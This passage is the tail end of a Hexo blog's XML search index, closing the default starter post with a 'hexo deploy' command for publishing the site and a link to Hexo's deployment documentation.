to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
